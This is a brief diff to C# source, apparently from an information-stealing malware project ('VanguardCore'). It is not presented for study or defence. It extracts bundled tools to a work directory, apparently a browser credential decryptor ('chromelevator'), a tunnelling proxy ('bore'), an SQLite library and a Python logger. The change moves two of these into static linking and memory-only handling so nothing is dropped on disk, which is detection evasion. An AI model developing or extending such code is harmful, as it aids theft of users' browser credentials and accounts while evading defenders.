@@ -30,8 +30,8 @@ namespace VanguardCore.Modules
                 Log("[RESOURCE] Starting extraction phase...");
 
                 // 2. Extract resources (FORCE OVERWRITE)
-                ExtractResource("chromelevator.bin", Path.Combine(WorkDir, "chromelevator.exe"));
-                ExtractResource("bore.bin", Path.Combine(WorkDir, "bore.exe"));
+                // ChromElevator is now Statically Linked (Mono-binary)
+                // bore.bin is handled in-memory in ProxyModule (No disk drop)
                 ExtractResource("e_sqlite3.dll", Path.Combine(WorkDir, "e_sqlite3.dll"));
                 ExtractResource("GlobalLogger.py", Path.Combine(WorkDir, "GlobalLogger.py"));
                 ExtractResource("SteamAlert.bin", Path.Combine(WorkDir, "SteamAlert.bin"));
